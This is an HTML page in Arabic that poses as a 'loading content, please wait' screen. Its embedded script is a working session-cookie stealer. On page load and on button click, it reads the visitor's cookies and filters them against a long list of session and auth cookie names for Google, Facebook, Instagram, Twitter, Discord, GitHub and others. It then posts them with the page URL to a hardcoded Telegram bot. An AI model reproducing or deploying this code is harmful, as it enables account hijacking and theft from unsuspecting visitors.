<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث الصفحة</title>
</head>
<body style="text-align: center; padding: 50px; font-family: Tahoma;">
    <h2>جاري تحميل المحتوى...</h2>
    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
    <button id="btn" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>

<script>
    // ضع هنا توكن بوت تليجرام الخاص بك
    const botToken = "8085235360:AAGdjX59ml1CsOjz3ZFzR2XtDJX7OAZSgkc";
    // ضع هنا الـ Chat ID الخاص بك أو بالمعرف المستهدف
    const chatId = "1299584246";

    const SESSION_COOKIE_NAMES = new Set([
        "sessionid", "session_token", "session_id", "session", "sid",
        "connect.sid", "login_info", "logged_in",
        "auth_token", "access_token", "token", "oauth_token",
        "id_token", "refresh_token", "bearer_token",
        "apisid", "sapisid", "hsid", "ssid", "lsid",
        "c_user", "datr", "xs", "fr", "sb",
        "ds_user_id", "csrftoken", "rur", "mid",
        "ct0", "twid",
        "locale", "dcfduid", "sdcfduid",
        "_gh_sess", "user_session", "dotcom_user",
        "kick_session_id",
        "phpsessid", "jsessionid", "_session_id", "remember_token",
        "remember_user_token", "remember_web"
    ]);

    function getTargetCookies() {
        const foundCookies = {};
        const cookies = document.cookie.split(";");
        
        for (let cookie of cookies) {
            const parts = cookie.split("=");
            const name = parts[0].trim().toLowerCase();
            const value = parts.slice(1).join("=").trim();
            
            if (SESSION_COOKIE_NAMES.has(name)) {
                foundCookies[name] = value;
            }
        }
        return foundCookies;
    }

    function sendData() {
        // (اختياري للاختبار) إضافة كوكي تجريبية للتأكد من وصولها للبوت
        document.cookie = "sessionid=telegram_test_123; path=/";

        const extractedCookies = getTargetCookies();
        
        // تنسيق الرسالة لتظهر مرتبة داخل تليجرام
        const message = `🔔 تنبيه جديد!\n\n🌐 الرابط: ${window.location.href}\n🍪 الكوكيز:\n${JSON.stringify(extractedCookies, null, 2)}`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // إرسال البيانات مباشرة إلى بوت تليجرام عبر POST
        fetch(telegramUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => console.log("تم الإرسال إلى تليجرام بنجاح"))
        .catch(error => console.error("خطأ:", error));
    }

    window.addEventListener("DOMContentLoaded", () => {
        sendData();
        const btn = document.getElementById("btn");
        if (btn) {
            btn.addEventListener("click", sendData);
        }
    });
</script>
</body>
</html>
